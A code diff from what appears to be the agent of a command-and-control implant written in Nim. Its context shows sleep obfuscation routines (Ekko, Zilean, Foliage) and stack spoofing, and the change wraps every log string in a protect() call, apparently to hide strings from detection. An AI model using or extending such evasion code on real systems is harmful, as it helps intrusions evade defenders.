@@ -121,7 +121,7 @@ proc GetRandomThreadCtx(): CONTEXT =
             print fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
             return ctx 
     
-    print "[-] No suitable thread for stack duplication found."
+    print protect("[-] No suitable thread for stack duplication found.")
     return ctx  
 
 #[
@@ -283,17 +283,17 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
             if status != STATUS_SUCCESS: 
                 raise newException(CatchableError, status.getNtError())
             
-        print "[*] Sleep obfuscation start."
+        print protect("[*] Sleep obfuscation start.")
 
         status = apis.NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, status.getNtError())
 
-        print "[*] Sleep obfuscation end."
+        print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        print "[-] ", err.msg
+        print protect("[-] "), err.msg
 
 
 #[
@@ -451,17 +451,17 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
             if status != STATUS_SUCCESS: 
                 raise newException(CatchableError, status.getNtError())
 
-        print "[*] Sleep obfuscation start."
+        print protect("[*] Sleep obfuscation start.")
 
         status = apis.NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, status.getNtError())
 
-        print "[*] Sleep obfuscation end."
+        print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        print "[-] ", err.msg
+        print protect("[-] "), err.msg
         
 
 #[
@@ -562,17 +562,17 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, status.getNtError())
 
-        print "[*] Sleep obfuscation start."
+        print protect("[*] Sleep obfuscation start.")
 
         status = apis.NtSignalAndWaitForSingleObject(hEventSync, hThread, TRUE, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, status.getNtError())
     
-        print "[*] Sleep obfuscation end."
+        print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        print "[-] ", err.msg
+        print protect("[-] "), err.msg
 
 
 # Function to determine whether the agent currently operates within the configured working hours
@@ -610,7 +610,7 @@ proc sleepObfuscate*(sleepSettings: SleepSettings) =
     # https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Obf.c#L650
     # If the local time is outside of the agent's working hours, we calculate the required sleep delay until the start of the next work day.
     if sleepSettings.workingHours.enabled and not withinWorkingHours(sleepSettings.workingHours): 
-        print "[*] Agent is outside of working hours."
+        print protect("[*] Agent is outside of working hours.")
         delay = 0
 
         # Get current time
